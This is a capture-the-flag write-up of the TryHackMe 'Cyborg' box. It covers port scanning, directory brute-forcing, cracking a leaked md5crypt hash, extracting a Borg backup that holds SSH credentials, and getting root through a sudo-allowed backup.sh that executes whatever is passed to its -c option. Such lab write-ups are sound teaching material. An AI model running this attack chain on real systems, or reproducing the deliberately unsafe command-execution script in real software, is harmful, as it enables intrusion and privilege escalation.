---
author: "Shebu"
title: "Cyborg: THM"
date: "2021-12-25"
tags: ["squid-proxy", "borg backup", "getopts", "command injection"]
cover:
    image: "img/cyborg.png"
    # can also paste direct link from external site
    # ex. https://i.ibb.co/K0HVPBd/paper-mod-profilemode.png
    alt: "<alt text>"
    caption: "<text>"
    relative: false # To use relative path for cover image, used in hugo Page-bundles
---

# Description
-------------------

A box involving encrypted archives, source code analysis and more.

|  **Room name** 	| Cyborg                                           	|
|:--------------:	|----------------------------------------------------	|
|     **OS**     	| Linux                                              	|
| **Difficulty** 	| Easy                                             	|
|  **Room Link** 	| [https://tryhackme.com/room/cyborgt8](https://tryhackme.com/room/cyborgt8)               	|
|   **Creator**  	| [fieldraccoon](https://tryhackme.com/p/fieldraccoon) 	|

# Enumeration

## Portscan

```bash
┌──(root💀kali)-[~/Cyborg]
└─# rustscan -a cyborg.thm -- -sV -sC -oN cyborg.nmap

# Nmap 7.92 scan initiated Sat Jan 22 10:09:17 2022 as: nmap -vvv -p 22,80 -sV -sC -oN cyborg.nmap 10.10.194.216
Nmap scan report for cyborg.thm (10.10.194.216)
Host is up, received echo-reply ttl 63 (0.25s latency).
Scanned at 2022-01-22 10:09:19 EST for 15s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtLmojJ45opVBHg89gyhjnTTwgEf8lVKKbUfVwmfqYP9gU3fWZD05rB/4p/qSoPbsGWvDUlSTUYMDcxNqaADH/nk58URDIiFMEM6dTiMa0grcKC5u4NRxOCtZGHTrZfiYLQKQkBsbmjbb5qpcuhYo/tzhVXsrr592Uph4iiUx8zhgfYhqgtehMG+UhzQRjnOBQ6GZmI4NyLQtHq7jSeu7ykqS9KEdkgwbBlGnDrC7ke1I9352lBb7jlsL/amXt2uiRrBgsmz2AuF+ylGha97t6JkueMYHih4Pgn4X0WnwrcUOrY7q9bxB1jQx6laHrExPbz+7/Na9huvDkLFkr5Soh
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBB5OB3VYSlOPJbOwXHV/je/alwaaJ8qljr3iLnKKGkwC4+PtH7IhMCAC3vim719GDimVEEGdQPbxUF6eH2QZb20=
|   256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKlr5id6IfMeWb2ZC+LelPmOMm9S8ugHG2TtZ5HpFuZQ
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 22 10:09:34 2022 -- 1 IP address (1 host up) scanned in 17.23 seconds
```

## Website

It gives us the default apache page and nothing else.

*[Image: website1]*

Lets do some directory-bruteforcing .

```bash
┌──(root💀kali)-[~/Cyborg]
└─# dirsearch -u cyborg.thm -w /usr/share/wordlists/dirb/common.txt 

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )
                                                                                                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /root/.dirsearch/reports/cyborg.thm/_22-01-22_10-18-59.txt

Error Log: /root/.dirsearch/logs/errors-22-01-22_10-18-59.log

Target: http://cyborg.thm/
                                                                                                                                                            
[10:19:00] Starting: 
[10:19:06] 301 -  308B  - /admin  ->  http://cyborg.thm/admin/   
[10:19:23] 301 -  306B  - /etc  ->  http://cyborg.thm/etc/      
[10:19:29] 200 -   11KB - /index.html                 
[10:19:47] 403 -  275B  - /server-status                 
                                                            
Task Completed 
```
### /admin

*[Image: website2]*

There is a possible username called `Alex` in setup description.

Clicking on `admin` tab leads us to `/admin/admin.html`

*[Image: website3]*

Seems like a chat between `Josh`, `Adam` and `Alex` where he mentions about some kind of music_archive.

The `archive` tab gives us two more options `listen` and `download`

*[Image: website4]*

Clicking on download button downloads an **archive.tar** file.

*[Image: website5]*

### /etc

*[Image: website6]*

*[Image: website7]*

The **passwd** file contains a hash

*[Image: website8]*

The **squid.conf** file contains the squid proxy configuration. 

*[Image: website9]* 

# Shell as Alex
--------------------------

Lets untar the tar archive and examine it.

```bash
┌──(root💀kali)-[~/Cyborg]
└─# tar -xvf archive.tar 
home/field/dev/final_archive/
home/field/dev/final_archive/hints.5
home/field/dev/final_archive/integrity.5
home/field/dev/final_archive/config
home/field/dev/final_archive/README
home/field/dev/final_archive/nonce
home/field/dev/final_archive/index.5
home/field/dev/final_archive/data/
home/field/dev/final_archive/data/0/
home/field/dev/final_archive/data/0/5
home/field/dev/final_archive/data/0/3
home/field/dev/final_archive/data/0/4
home/field/dev/final_archive/data/0/1

┌──(root💀kali)-[~/Cyborg]
└─# cd home/field/dev/final_archive/ 

┌──(root💀kali)-[~/…/home/field/dev/final_archive]
└─# ls
config  data  hints.5  index.5  integrity.5  nonce  README
```

So it contains 7 files .Lets check out the `README` file first.

## borg archive

```bash
┌──(root💀kali)-[~/…/home/field/dev/final_archive]
└─# cat README  
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```

So it tells us this is a `borg archive` repository & also provides a link to its documentation website.

Here you can read how to extract contents from the borg archive: [https://borgbackup.readthedocs.io/en/stable/usage/extract.html](https://borgbackup.readthedocs.io/en/stable/usage/extract.html)

```
┌──(root💀kali)-[~/Cyborg]
└─# borg extract home/field/dev/final_archive::music_archive
Enter passphrase for key /root/Cyborg/home/field/dev/final_archive: 
```
It asks us for a passphrase. Remember we got a hash from the website earlier ! Let crack it using john.

## jtr

```bash
┌──(root💀kali)-[~/Cyborg]
└─# john hash --wordlist=/usr/share/wordlists/rockyou.txt                                                                                             130 ⨯
Created directory: /root/.john
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 SSE2 4x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
squ****rd        (?)     
1g 0:00:00:00 DONE (2022-01-22 10:50) 1.052g/s 41027p/s 41027c/s 41027C/s wonderfull..samantha5
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Now since we have the password lets extract the contents of the borg archive.

We get a folder called `alex`. Lets see what's in here

```bash
┌──(root💀kali)-[~/Cyborg/home]
└─# tree alex                                                                                                                                         127 ⨯
alex
├── Desktop
│ └── secret.txt
├── Documents
│ └── note.txt
├── Downloads
├── Music
├── Pictures
├── Public
├── Templates
└── Videos

8 directories, 2 files
```
`secret.txt` wasn't useful but `note.txt` had SSH creds for the user `Alex`

```bash
┌──(root💀kali)-[~/Cyborg/home]
└─# cat alex/Desktop/secret.txt 
shoutout to all the people who have gotten to this stage whoop whoop!"

┌──(root💀kali)-[~/Cyborg/home]
└─# cat alex/Documents/note.txt 
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3********3
```
## user.txt 🚩

Lets ssh in as alex & grab the user.txt flag !

```bash
┌──(root💀kali)-[~/Cyborg/home]
└─# ssh alex@cyborg.thm                                                                                                                               130 ⨯
alex@cyborg.thm's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

27 packages can be updated.
0 updates are security updates.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

alex@ubuntu:~$ whoami
alex
alex@ubuntu:~$ id
uid=1000(alex) gid=1000(alex) groups=1000(alex),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)

alex@ubuntu:~$ cat user.txt
flag{1_hop3*******************saf3}
```

# Shell as root
------------------

Running `sudo -l` reveals that we could run `backup.sh` as root

```bash
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```
## backup.sh

```bash
alex@ubuntu:~$ cat /etc/mp3backups/backup.sh
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt

input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
        case "${flag}" in 
                c) command=${OPTARG};;
        esac
done

backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd
```

From the above code , we could understand that it backups all the music files but this particular lines stand out 

## getopts

```bash
while getopts c: flag
do
        case "${flag}" in 
                c) command=${OPTARG};;
        esac
done
```
Here it asks for a input flag `-c` using `getopts` and executes the i/p command given to `-c` at the end of the script 

```bash
cmd=$($command)
echo $cmd
```

> **getopts** is a very convenient bash script utility, which helps you to conveniently handle the passing of flags

Let try giving `id` command as i/p in `-c` flag

```bash
alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh -c id

[redacted]

Backup finished
uid=0(root) gid=0(root) groups=0(root)
```
It works !! 

## root.txt 🚩

Lets now retreive **root.txt** flag 

```bash
alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt"

[redacted]

Backup finished
flag{Than5s****************enJ053d}
```
